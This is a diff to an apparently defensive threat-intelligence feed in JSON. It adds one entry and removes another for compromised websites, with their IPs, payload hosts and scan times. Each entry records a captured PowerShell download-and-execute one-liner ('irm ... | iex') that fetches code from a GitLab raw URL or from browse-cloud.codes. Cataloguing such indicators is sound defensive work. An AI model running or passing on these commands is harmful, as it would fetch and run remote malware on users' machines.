@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "www.agenciatllevamos.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "67.205.27.248"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwhq6uff0ttl0omlkcvw2hab",
+    "ScannedAt": "2026-11-15T11:02:39.036000+00:00"
+  },
+  {
     "UrlDomain": "www.italstrutture.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -3307,27 +3327,5 @@
     ],
     "ReportId": "cmwdhc1qp041s0oml2r6bl190",
     "ScannedAt": "2026-11-12T11:43:40.561000+00:00"
-  },
-  {
-    "UrlDomain": "www.scaffoldingsuppliesforsale.co.uk",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "185.151.30.174"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/ebafc1c6261b57b5",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/ebafc1c6261b57b5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/ebafc1c6261b57b5"
-    ],
-    "ReportId": "cmwdguwhj03zw0omlnorqrh3r",
-    "ScannedAt": "2026-11-12T11:30:20.446000+00:00"
   }
 ]
